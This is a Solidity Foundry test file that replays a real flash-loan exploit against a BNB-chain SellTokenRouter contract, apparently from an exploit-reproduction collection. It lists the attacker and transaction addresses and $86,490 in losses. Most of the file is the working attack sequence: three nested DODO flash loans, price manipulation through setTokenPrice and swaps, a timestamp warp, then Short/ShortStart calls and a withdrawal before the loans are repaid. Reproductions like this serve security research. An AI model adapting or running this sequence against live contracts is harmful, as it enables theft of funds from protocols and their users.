// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./interface/cheat.sol";
import "./interface/IPancakePair.sol";
import "./interface/IWBNB.sol";
import "./interface/IDODO.sol";
import "./interface/IERC20.sol";
import "./interface/IPancakeRouter02.sol";

// Total Lost: $86,490
// Chain: BNB
// Attacker: 0x1581262fd72776ba5da2337c4c4e1b92c6e36ae6
// Attack Contract: 0x19ed7cd5f1d2bd02713131344d6890454d7c599f
// Attack Tx: 0x893453b1c9db19d59548bf05c9213e1d2a9ff8195c4f0bc5f17bba9b3b18beee
// Vulnerable Contract: 0x57Db19127617B77c8abd9420b5a35502b59870D6

// Pre tx: 0x4512e62d797b1d9a47c165f8d907a6f0d6ca6e9d038f5839f66c7a5f8a161025

contract SafemoonExp is Test {
    CheatCodes constant cheat =
        CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    IPancakeRouter02 constant PancakeRouterv2 =
        IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    WBNB constant wbnb = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IDODO constant flashLoanPool =
        IDODO(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IDODO constant flashLoanPool1 =
        IDODO(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    IDODO constant flashLoanPool2 =
        IDODO(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);

    SellToken constant sellToken =
        SellToken(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4);
    SellTokenRouter constant sellTokenRouter =
        SellTokenRouter(0x57Db19127617B77c8abd9420b5a35502b59870D6);

    function setUp() public {
        cheat.createSelectFork("bsc", 28167836);
    }

    function testHello() public payable {
        flashLoanPool.flashLoan(
            519334285653568463716,
            0,
            address(this),
            "0x00"
        );
    }

    //Note: CallBack function executed by DODOV2(DPP) flashLoan pool
    function DPPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external {
        _flashLoanCallBack(sender, baseAmount, quoteAmount, data);
    }

    //Note: CallBack function executed by DODOV2(DSP) flashLoan pool
    function DSPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external {
        _flashLoanCallBack(sender, baseAmount, quoteAmount, data);
    }

    function _flashLoanCallBack(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) internal {
        address mid = 0x8D190C70937493046a464440d28f126A4E42eF7f;
        vm.deal(address(this), 2 ether);
        // 三次闪电贷，获取到足够多的金额
        if (keccak256(data) == keccak256("0x00")) {
            flashLoanPool1.flashLoan(
                968283413090749091532,
                0,
                address(this),
                "0x01"
            );
        } else if (keccak256(data) == keccak256("0x01")) {
            flashLoanPool2.flashLoan(
                418509475390597934136,
                0,
                address(this),
                "0x02"
            );
        } else {
            console2.log("In Flashloan ...");
            console2.log(
                "After Flashloan,  WBNB balance of this: ",
                wbnb.balanceOf(address(this))
            );
            // 前置交易
            console2.log("In PreTX ...");
            address[] memory path = new address[](2);
            path[0] = address(wbnb);
            path[1] = address(sellToken);
            wbnb.approve(address(PancakeRouterv2), UINT256_MAX);
            PancakeRouterv2.swapExactTokensForTokens(
                500 * 1e18,
                0,
                path,
                address(this),
                block.timestamp
            );
            console2.log(
                "After swap, wbnb balance of this: ",
                wbnb.balanceOf(address(this))
            );
            sellTokenRouter.setTokenPrice(address(sellToken));

            path[0] = address(sellToken);
            path[1] = address(wbnb);
            sellToken.approve(address(PancakeRouterv2), UINT256_MAX);
            PancakeRouterv2
                .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    sellToken.balanceOf(address(this)),
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            // uint temp = 1906127174134915489384 - wbnb.balanceOf(address(this));
            uint temp = 18 * 1e17;
            console2.log("wbnb temp: ", temp);
            wbnb.deposit{value: temp}();
            console2.log(
                "After deposit, wbnb balance of this: ",
                wbnb.balanceOf(address(this))
            );
            console2.log("timestamp: ", block.timestamp);

            // 攻击交易
            // vm.roll(28167837);
            console2.log("In AttackTX ...");
            // 修改时间戳，满足攻击条件
            vm.warp(1683961435);
            path[0] = address(wbnb);
            path[1] = address(sellToken);
            wbnb.approve(address(PancakeRouterv2), UINT256_MAX);
            PancakeRouterv2.swapExactTokensForTokens(
                500 * 1e18,
                0,
                path,
                address(this),
                block.timestamp
            );
            console2.log(
                "After swap, wbnb balance of this: ",
                wbnb.balanceOf(address(this))
            );

            wbnb.withdraw(wbnb.balanceOf(address(this)));

            sellTokenRouter.Short(address(this), address(sellToken));

            uint _balance = sellToken.balanceOf(address(mid));
            console2.log("sellToekn balance of 0x8D190C: ", _balance);
            uint amount = sellTokenRouter.getToken2Price(
                address(sellToken),
                address(wbnb),
                _balance
            );
            console2.log("amount: ", amount);
            amount = amount / 10 - 1;
            console2.log("transfer bnb: ", amount);

            sellTokenRouter.ShortStart{value: amount}(
                address(sellToken),
                address(this),
                1
            );
            console2.log(
                "After ShortStart, sellToekn balance of this: ",
                sellToken.balanceOf(address(this))
            );

            //
            path[0] = address(sellToken);
            path[1] = address(wbnb);
            sellToken.approve(address(PancakeRouterv2), UINT256_MAX);
            PancakeRouterv2
                .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    sellToken.balanceOf(address(this)),
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            sellTokenRouter.withdraw(address(sellToken));
            wbnb.deposit{value: address(this).balance}();
            console2.log(
                "After deposit, wbnb balance of this: ",
                wbnb.balanceOf(address(this))
            );

            //Return funds
            wbnb.transfer(address(flashLoanPool), 519334285653568463716);
            wbnb.transfer(address(flashLoanPool1), 968283413090749091532);
            wbnb.transfer(address(flashLoanPool2), 418509475390597934136);
            console2.log("Flashloan payback success");
            console2.log(
                "After attack, wbnb balance of this: ",
                wbnb.balanceOf(address(this))
            );
        }
    }

    receive() external payable {}
}

interface SellToken {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function decimals() external view returns (uint8);

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) external returns (bool);

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) external returns (bool);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

interface SellTokenRouter {
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    function Short(
        address,
        address
    )
        external
        view
        returns (
            address token,
            address coin,
            uint256 bnb,
            uint256 tokenPrice,
            uint256 time
        );

    function ShortStart(
        address coin,
        address addr,
        uint256 terrace
    ) external payable;

    function allAddress(uint256) external view returns (address);

    function getMyPrice(address token) external view returns (uint256, uint256);

    function getMyPriceSell()
        external
        view
        returns (address[] memory add, uint256[] memory, uint256[] memory);

    function getShorts(
        address token
    ) external view returns (uint256, uint256, uint256, uint256, uint256);

    function getShortsMoV(
        address token,
        address token1
    ) external view returns (uint256);

    function getToken2Price(
        address token,
        address bnbOrUsdt,
        uint256 bnb
    ) external view returns (uint256);

    function getToken3Price(
        address token,
        address bnbOrUsdt
    ) external view returns (uint256);

    function getTokenName(
        address token
    ) external view returns (string memory, string memory, uint256);

    function isAdd(address) external view returns (bool);

    function mkt() external view returns (address);

    function mySells(address) external view returns (uint256 mnu);

    function owner() external view returns (address);

    function renounceOwnership() external;

    function setTokenPrice(address _token) external;

    function setfee(address _trdt, uint256 uid, address addr) external;

    function settleAccounts() external view returns (uint256);

    function sum() external view returns (uint256);

    function terraces(uint256) external view returns (address);

    function tokenPrice(address, address) external view returns (uint256);

    function tokenPriceTime(address, address) external view returns (uint256);

    function transferOwnership(address newOwner) external;

    function withdraw(address token) external;
}
